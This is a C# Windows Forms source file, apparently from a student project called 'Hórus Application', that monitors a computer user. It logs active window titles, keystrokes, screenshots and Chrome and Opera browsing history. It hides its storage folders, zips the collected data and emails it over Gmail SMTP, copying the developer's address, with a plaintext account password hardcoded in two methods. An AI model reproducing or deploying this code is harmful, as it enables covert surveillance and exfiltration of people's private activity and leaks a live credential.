        private string getActiveWindowName()
        {
            const int nChar = 256;
            IntPtr handle = IntPtr.Zero;
            StringBuilder Buff = new StringBuilder(nChar);
            handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChar) > 0)
            {
                return Buff.ToString();
            }

            return null;
        }

        string username;

        private void Time_Tick(object sender, EventArgs e)
        {
            getWindowTitle();
            username = Environment.UserName;           
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            pictureBox1.Visible = false;
            label1.Text = "Teclas Capturadas";
            button2.Visible = true;

            panel1.Size = new Size(0, 525);
            panel3.Size = new Size(0, 525);
            panel4.Size = new Size(0, 525);
            panel6.Visible = true;

            tabControl2.Visible = false;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        int luz = 1;

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {         
            if (luz == 1)
            {
                panel2.BackColor = Color.White;
                menuStrip1.BackColor = Color.Cyan;

                button1.ForeColor = Color.Black;
                button2.ForeColor = Color.Black;
                button3.ForeColor = Color.Black;
                button4.ForeColor = Color.Black;

                label1.ForeColor = Color.Black;

                panel1.BackColor = Color.LightCyan;
                panel3.BackColor = Color.LightCyan;
                panel4.BackColor = Color.LightCyan;

                pictureBox1.BackColor = Color.White;

                this.BackgroundImage = HorusApplication.Properties.Resources.Principal_Background2;

                
                frmAcesso meuForm = new frmAcesso();

                try
                {
                    frmAcesso.cor = 2;
                }
                catch{}                

                frmAviso_Saida form = new frmAviso_Saida();

                try
                {
                    frmAviso_Saida.tente = 2;
                }
                catch{}                     
                
                luz = 2;               
            }
            else if (luz == 2)
            {
                panel2.BackColor = Color.FromArgb(16, 16, 17);
                menuStrip1.BackColor = Color.FromArgb(33, 33, 37);

                button1.ForeColor = Color.White;
                button2.ForeColor = Color.White;
                button3.ForeColor = Color.White;
                button4.ForeColor = Color.White;

                label1.ForeColor = Color.White;

                panel1.BackColor = Color.FromArgb(64, 64, 64);
                panel3.BackColor = Color.FromArgb(64, 64, 64);
                panel4.BackColor = Color.FromArgb(64, 64, 64);

                this.BackgroundImage = HorusApplication.Properties.Resources.Principal_Background;                

                pictureBox1.BackColor = Color.Black;

                
                frmAcesso meuForm = new frmAcesso();

                try
                {
                    frmAcesso.cor = 1;
                }
                catch{ }

                frmAviso_Saida form = new frmAviso_Saida();

                try
                {
                    frmAviso_Saida.tente = 1;
                }
                catch{}     
                luz = 1;
            }

            else { }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            string dTelas = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas";
            string dprints = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\prints";
            string dwprints = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\wprints";
            string dfprints = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\fprints";
            
                if (Directory.Exists(dTelas))
                {
                    System.IO.Directory.Delete(dprints, true);
                    System.IO.Directory.Delete(dwprints, true);
                    System.IO.Directory.Delete(dfprints, true);
                    //MessageBox.Show("Folder Deleted");
                }
                else
                {
                    //MessageBox.Show("Folder Not Deleted");
                }

                DirectoryInfo prints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\prints");
                prints.Attributes = FileAttributes.Hidden;

                DirectoryInfo wprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\wprints");
                wprints.Attributes = FileAttributes.Hidden;

                DirectoryInfo fprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\fprints");
                fprints.Attributes = FileAttributes.Hidden;               
        }

        private void button7_Click(object sender, EventArgs e)
        {
            timer1.Stop();
            timer2.Stop();
            timer3.Stop();

            GC.Collect();
            GC.WaitForPendingFinalizers();

            panel1.Controls.Clear();
            panel3.Controls.Clear();
            panel4.Controls.Clear();

            pictureBox1.Image = null;

            panel1.Visible = false;
            panel3.Visible = false;
            panel4.Visible = false;
            pictureBox1.Visible = false;

            label1.Text = "Hórus Application";
            button2.Visible = false;
            panel6.Visible = false;
        }      

        private void button5_Click_1(object sender, EventArgs e)
        {
            Application.Exit();
        }

        int fred = 1;

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            label12.Visible = false;

            if (fred == 1)
            {
                tabControl1.Size = new Size(312, 444);
                fred = 2;
            }
            else if (fred == 2)
            {
                tabControl1.Size = new Size(0, 444);
                fred = 1;
            }
            else { }            
        }
        /*
        private Size Size(int p, int p_2)
        {
            throw new NotImplementedException();
        }*/

        public void E_mailNet()
        {
            System.Net.Mail.MailMessage message = new System.Net.Mail.MailMessage();            
            message.To.Add(email);
            message.CC.Add("horusapplicationtcc@gmail.com");
            System.Net.Mail.Attachment anexo = new System.Net.Mail.Attachment(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas.zip");
            message.Attachments.Add(anexo);
            message.Subject = "Atualização de Status";

            message.From = new System.Net.Mail.MailAddress("horusapplicationtcc@gmail.com");
            message.Body = "Novas informações capturadas";

            System.Net.Mail.SmtpClient smtp = new System.Net.Mail.SmtpClient();
            smtp.Host = "smtp.gmail.com"; //smtp do gmail
            //smtp.Host = "smtp.live.com"; //smtp do hotmail
            smtp.EnableSsl = true;
            smtp.Port = 587;
            smtp.UseDefaultCredentials = false;
            
            smtp.Credentials = new System.Net.NetworkCredential("horusapplicationtcc@gmail.com", "fysrcrbudqncjzcc");
            smtp.Send(message);

            System.IO.File.Delete(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas.zip");
        }

        public void Primeiro_E_mailNet()
        {
            System.Net.Mail.MailMessage message = new System.Net.Mail.MailMessage();
            message.To.Add(email);
            message.CC.Add("horusapplicationtcc@gmail.com");
            message.Subject = "Testando Endereço de Email";
            // nesta linha abaixo onde tem "E-mail" vc deve colocar o seu email.
            message.From = new System.Net.Mail.MailAddress("horusapplicationtcc@gmail.com");
            message.Body = "Email Valido";

            System.Net.Mail.SmtpClient smtp = new System.Net.Mail.SmtpClient();
            smtp.Host = "smtp.gmail.com"; //smtp do gmail
            //smtp.Host = "smtp.live.com"; //smtp do hotmail
            smtp.EnableSsl = true;
            smtp.Port = 587;
            smtp.UseDefaultCredentials = false;
            // nesta linha abaixo e onde vc coloca seu email e senha para fazer a conexão onde ira enviar sua mensagem para o seu destinatario.
            smtp.Credentials = new System.Net.NetworkCredential("horusapplicationtcc@gmail.com", "fysrcrbudqncjzcc");
            smtp.Send(message);
            //MessageBox.Show("E-mail enviado com sucesso!", "Informativo", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }


        private void button7_Click_1(object sender, EventArgs e)
        {

            if (checkBox5.Checked == true)
            {
                try
                {
                    label6.Text = "Email enviado com sucesso. Verique a caixa de entrada";
                    Primeiro_E_mailNet();

                   
                }
                catch
                {
                    label6.Text = "Falha ao enviar. Verifique o endereço";
                    tbxPara.Clear();
                }
            }
            else
            { }
        }

        private void button6_Click_1(object sender, EventArgs e)
        {
            frmAcesso.senha = textBox6.Text;
            textBox6.Clear();
            label12.Visible = true;
        }

        private void Monitoramento_Tick(object sender, EventArgs e)
        {

        }

        string email;

        private void button8_Click(object sender, EventArgs e)
        {
            email = tbxPara.Text;
            tbxPara.Clear();
        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            tabControl2.Visible = true; 
            pictureBox1.Visible = false;
            label1.Text = "Sites Acessados";
            button2.Visible = true;
            panel1.Size = new Size(0, 525);
            panel3.Size = new Size(0, 525);
            panel4.Size = new Size(0, 525);
            panel6.Visible = false;
        }

        int contador, contador1;

        private void Url_Tick(object sender, EventArgs e)
        {           
            try
            {
                string google = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";
                SQLiteConnection cn = new SQLiteConnection("Data Source=" + google + ";Version=3;New=False;Compress=True;");
                cn.Open();
                SQLiteDataAdapter sd = new SQLiteDataAdapter("select url AS [URL], title AS [Título], time(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') AS [Horário], date(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch') As [Data] from urls order by last_visit_time desc", cn);
                DataSet ds = new DataSet();
                sd.Fill(ds);
                dataGridView1.DataSource = ds.Tables[0];
                cn.Close();


                contador = contador + 1;

                cc = new StreamWriter(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\url\Chrome.txt");


                foreach (DataRow r in ds.Tables[0].Rows)
                {
                    foreach (object i in r.ItemArray)
                    {
                        cc.WriteLine(i.ToString());
                        cc.WriteLine("-----//-----");
                    }
                }

                cc.Write(sd);
                cc.Close();
            }
            catch { }

            
        }

        private object strftime(string p, string p_2)
        {
            throw new NotImplementedException();
        }

        private void panel4_Paint(object sender, PaintEventArgs e)
        {

        }

        private void listBox5_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void opera_Tick(object sender, EventArgs e)
        {
            try
            {
                string opera = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\History";
                SQLiteConnection cn = new SQLiteConnection("Data Source=" + opera + ";Version=3;New=False;Compress=True;");
                cn.Open();
                SQLiteDataAdapter sd = new SQLiteDataAdapter("select url AS [URL], title AS [Título], time(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') AS [Horário], date(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch') As [Data] from urls order by last_visit_time desc", cn);
                DataSet ds = new DataSet();
                sd.Fill(ds);
                dataGridView3.DataSource = ds.Tables[0];
                cn.Close();


                contador1 = contador1 + 1;

                cc = new StreamWriter(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\url\Opera.txt");


                foreach (DataRow r in ds.Tables[0].Rows)
                {
                    foreach (object i in r.ItemArray)
                    {
                        cc.WriteLine(i.ToString());
                        cc.WriteLine("-----//-----");
                    }
                }

                cc.Write(sd);
                cc.Close();
            }
            catch { }
        }

        int ime = 0;

        private void timer5_Tick(object sender, EventArgs e)
        {
            ime = ime + 1;

                    if (ime == 1)
                    {
                        timer1.Stop();
                        timer2.Stop();
                        timer3.Stop();

                        GC.Collect();
                        GC.WaitForPendingFinalizers();

                        panel1.Controls.Clear();
                        panel3.Controls.Clear();
                        panel4.Controls.Clear();

                        listBox1.Items.Clear();
                        listBox2.Items.Clear();
                        listBox3.Items.Clear();
                        listBox4.Items.Clear();

                        ((frmTelas)Application.OpenForms["frmTelas"]).HabilitarTimer(false);
                    }

                    else if (ime == 2)
                    {
                        string path = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas";
                        File.SetAttributes(path, FileAttributes.Hidden);

                        using (ZipFile zip = new ZipFile())
                        {
                            zip.AddDirectory(path);
                            zip.Save(path + ".zip");
                            zip.Dispose();
                        }
                    }

                    else if (ime == 3)
                    {
                        try
                        {
                            string dTelas = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas";
                            string dNotas = @"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas";


                            if (Directory.Exists(dTelas))
                            {
                                System.IO.Directory.Delete(dTelas, true);
                                System.IO.Directory.Delete(dNotas, true);
                            }

                            else { }
                        }

                        catch { }

                        frmTelas meuForm = new frmTelas();

                        try
                        {
                            meuForm.counter = 0;
                            meuForm.wcounter = 0;
                            meuForm.fcounter = 0;

                            cont = 0;
                            count = 0;

                            meuForm.a = null;
                            j = 0;
                            imgs = null;
                        }
                        catch
                        {
                            meuForm.Dispose();
                        }

                        DirectoryInfo telas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas");
                        telas.Attributes = FileAttributes.Hidden;

                        DirectoryInfo prints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\prints");
                        prints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo wprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\wprints");
                        wprints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo fprints = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\fprints");
                        fprints.Attributes = FileAttributes.Hidden;

                        DirectoryInfo url = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\url");
                        url.Attributes = FileAttributes.Hidden;  

                        DirectoryInfo notas = Directory.CreateDirectory(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\notas");
                        notas.Attributes = FileAttributes.Hidden; 

                        try
                        {
                            E_mailNet();
                        }
                        catch { }
                    }

                    else
                    {
                        timer1.Start();
                        timer2.Start();
                        timer3.Start();

                        ((frmTelas)Application.OpenForms["frmTelas"]).HabilitarTimer(true);
                    }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            timer5.Enabled = true;
            ime = 0;
        }

        
    }
}
